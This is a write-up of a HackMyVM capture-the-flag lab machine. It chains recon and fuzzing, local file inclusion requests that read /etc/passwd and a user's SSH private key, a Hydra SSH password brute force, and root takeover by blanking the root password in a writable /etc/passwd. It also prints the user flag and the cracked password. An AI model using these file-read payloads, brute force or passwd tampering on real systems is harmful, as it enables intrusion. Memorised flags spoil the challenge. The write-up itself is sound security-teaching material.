# HackMyVM - P4L4NC4 Writeup

> **Difficulty:** Easy  
> **Platform:** HackMyVM  
> **Author:** Kabir  
> **Category:** Linux | Web | LFI | Privilege Escalation

---

# Overview

Today we are back with another HackMyVM machine, and this time we have **P4L4NC4**.

Unlike most HackMyVM easy machines, this machine does **not** directly provide us with the target IP address. Therefore, our very first objective is to identify the IP of the victim machine on our local network before beginning any enumeration.

---

# Initial Reconnaissance

## Discovering the Target IP

Since the IP address is unknown, we can use **netdiscover** to identify active hosts on our subnet.

```bash
netdiscover -i eth1
```

> Replace **eth1** with your own network interface if it differs.

After a few seconds, the target machine appears.

**Target IP**

```
192.168.56.136
```

![Network Discovery](q1)

---

# Port Scanning

Now that we know the IP address, the next step is identifying exposed services.

We'll begin with a full TCP scan.

```bash
nmap -p- 192.168.56.136
```

Output:

```text
Nmap scan report for 192.168.56.136
Host is up.

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports are open.

- **22** — SSH
- **80** — HTTP

Since there are very few services exposed, our attack surface is quite limited, meaning the web server will likely be our primary entry point.

![Nmap Scan](q2)

---

# Service Enumeration

Next, let's perform a service and version scan.

```bash
nmap -sC -sV 192.168.56.136
```

Output:

```text
22/tcp open  ssh
OpenSSH 9.2p1 Debian

80/tcp open http
Apache httpd 2.4.62 (Debian)
```

Interesting observations:

- Debian Linux
- Apache 2.4.62
- OpenSSH 9.2
- Default HTTP methods enabled

No obvious vulnerabilities are immediately visible from version information.

![Service Scan](q3)

---

# Web Enumeration

Opening port **80** in the browser shows the default Apache landing page.

![Default Apache Page](q4)

This page usually doesn't contain anything useful by itself, but default pages often indicate that hidden files or directories may exist elsewhere.

To inspect requests and responses more closely, we'll intercept traffic using **Burp Suite** while browsing the application.

Nothing particularly interesting appears on the homepage.

Therefore, it's time to enumerate hidden resources.

---

# Common File Enumeration

Before beginning brute-force directory enumeration, it's always worth checking common files that developers frequently leave behind.

Examples include:

- robots.txt
- sitemap.xml
- security.txt
- humans.txt

Let's begin with **robots.txt**.

```
http://192.168.56.136/robots.txt
```

Interestingly, the page contains a long block of Portuguese text.

![robots.txt](q5)

The translated text discusses the **Giant Sable Antelope (Palanca Negra Gigante)**, an endangered animal native to Angola.

At first glance, this appears unrelated.

However, CTF authors rarely place large blocks of random text without a purpose.

Some keywords immediately stand out:

- Palanca
- Angola
- Malanje

The machine itself is named **P4L4NC4**, which strongly suggests that the challenge revolves around **leet (1337) transformations**.

---

# Directory Enumeration

Running Gobuster with standard wordlists initially produces nothing useful.

Since the machine name uses leetspeak, it makes sense that hidden resources may also use the same naming convention.

To generate a custom leetspeak wordlist, we can transform an existing dictionary.

```bash
cat misc/wordlist \
| sed 's/a/4/g' \
| sed 's/e/3/g' \
| sed 's/i/1/g' \
| sed 's/l/1/g' \
| sed 's/o/0/g' \
| sed 's/s/5/g' \
| sed 's/t/7/g' \
| sort | uniq | tr A-Z a-z \
> misc/wordlist_leet_lower
```

This converts common words into their leetspeak equivalents.

Examples:

```
malanje
↓

m414nj3
```

Now we rerun Gobuster using our newly generated wordlist.

```bash
gobuster dir \
-u http://192.168.56.136 \
-w misc/wordlist_leet_lower
```

This time we discover an interesting PHP file.

```
/n3gr4/m414nj3.php
```

Great!

However, opening the page simply returns an **HTTP 500 Internal Server Error**.

![500 Error](q6)

A 500 error often indicates that the script expects user input or a required parameter.

Instead of assuming the page is broken, we should determine whether it accepts GET parameters.

---

# Parameter Fuzzing

To discover hidden parameters, we'll use **ffuf**.

```bash
ffuf \
-u "http://192.168.56.136/n3gr4/m414nj3.php?FUZZ=test" \
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-fs 0
```

Among the tested parameters, one stands out.

```
page
```

It returns **HTTP 200 OK**.

![FFUF Parameter Discovery](q7)

This strongly suggests that the PHP application dynamically loads files.

That immediately raises suspicion of a **Local File Inclusion (LFI)** vulnerability.

---

# Confirming Local File Inclusion

A classic way to verify LFI is attempting to read `/etc/passwd`.

```
http://192.168.56.136/n3gr4/m414nj3.php?page=/etc/passwd
```

Success.

The server returns the contents of the system password file.

![LFI - /etc/passwd](q8)

Among the users we find:

```
p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
```

Now we know the valid system username.

```
p4l4nc4
```

---

# Reading the SSH Private Key

Since LFI allows arbitrary file reads, we should inspect sensitive files.

One obvious target is the user's SSH directory.

```
http://192.168.56.136/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa
```

This successfully discloses the user's private SSH key.

Unfortunately, attempting to authenticate with this key fails.

The key appears to be encrypted or otherwise unusable without its passphrase.

Since we already know the username, password authentication becomes our next option.

---

# SSH Password Brute Force

We'll use Hydra against SSH.

```bash
hydra \
-l p4l4nc4 \
-P /usr/share/wordlists/rockyou.txt \
ssh://192.168.56.136
```

Hydra successfully discovers the password.

```
friendster
```

We can now authenticate over SSH.

```bash
ssh p4l4nc4@192.168.56.136
```

![Hydra Success](q9)

---

# User Flag

After logging in, we verify our current directory.

```bash
ls
```

```
user.txt
```

Reading the flag:

```bash
cat user.txt
```

```
HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
```

User access obtained.

---

# Privilege Escalation Enumeration

Now the objective shifts to becoming **root**.

The first thing we should always do after obtaining shell access is perform local enumeration.

Some common commands include:

```bash
sudo -l

find / -perm -4000 2>/dev/null

find / -writable 2>/dev/null

env

id

groups

cat ~/.bash_history
```

The user's shell history contains something particularly interesting.

```bash
cat ~/.bash_history
```

```
find /etc -writable 2>/dev/null
```

This immediately suggests that someone previously searched for writable files inside `/etc`.

Repeating the command ourselves:

```bash
find /etc -writable 2>/dev/null
```

One file stands out.

```
/etc/passwd
```

![Writable Passwd](q10)

---

# Why is this Dangerous?

The `/etc/passwd` file stores account information for every local user.

Historically, password hashes were also stored inside this file.

Modern Linux systems store hashes inside `/etc/shadow`.

However, if the root account inside `/etc/passwd` has an **empty password field**, Linux may allow authentication without requiring any password.

Even more importantly, allowing unprivileged users to modify `/etc/passwd` is an extremely dangerous misconfiguration.

---

# Exploiting Writable /etc/passwd

Open the file.

```bash
nano /etc/passwd
```

Locate the root entry.

Original:

```
root:x:0:0:root:/root:/bin/bash
```

Modify it to remove the password placeholder.

```
root::0:0:root:/root:/bin/bash
```

Save the file.

Now switch users.

```bash
su - root
```

Since no password is now required, we immediately obtain a root shell.

![Root Shell](q11)

---

# Root Flag

Finally, read the root flag.

```bash
cd /root

cat root.txt
```

```
HMV{ROOT_FLAG}
```

![Root Flag](q12)

---

# Attack Path Summary

```
Network Discovery
        │
        ▼
Netdiscover
        │
        ▼
Nmap Enumeration
        │
        ▼
Apache Default Page
        │
        ▼
robots.txt
        │
        ▼
Leetspeak Hint
        │
        ▼
Custom Wordlist
        │
        ▼
Gobuster
        │
        ▼
m414nj3.php
        │
        ▼
Parameter Fuzzing
        │
        ▼
Local File Inclusion
        │
        ▼
Read /etc/passwd
        │
        ▼
Read SSH Key
        │
        ▼
Hydra Password Attack
        │
        ▼
SSH Access
        │
        ▼
Writable /etc/passwd
        │
        ▼
Remove Root Password
        │
        ▼
su - root
        │
        ▼
Read root.txt
```

---

# Vulnerabilities Identified

- Information disclosure through `robots.txt`
- Weak reliance on obscurity using leetspeak paths
- Local File Inclusion (LFI)
- Arbitrary file read
- Disclosure of sensitive SSH private key
- Weak SSH password susceptible to dictionary attack
- Insecure file permissions on `/etc/passwd`
- Privilege escalation through writable system files

---

# Lessons Learned

This machine demonstrates how several individually low-to-medium severity issues can chain together into a complete system compromise.

The attack chain followed this sequence:

- Discover the target on the network.
- Enumerate exposed services.
- Investigate seemingly harmless files like `robots.txt`.
- Recognize challenge-specific hints (leetspeak).
- Generate a custom wordlist.
- Discover hidden PHP functionality.
- Identify and exploit an LFI vulnerability.
- Read sensitive local files.
- Recover a valid username.
- Obtain SSH access using a weak password.
- Enumerate the local system after login.
- Exploit a dangerous `/etc/passwd` permission misconfiguration to obtain full root privileges.

Although each issue may appear minor in isolation, together they resulted in complete compromise of the target machine. This reinforces one of the most important principles in penetration testing: **small weaknesses often become critical when chained together.**
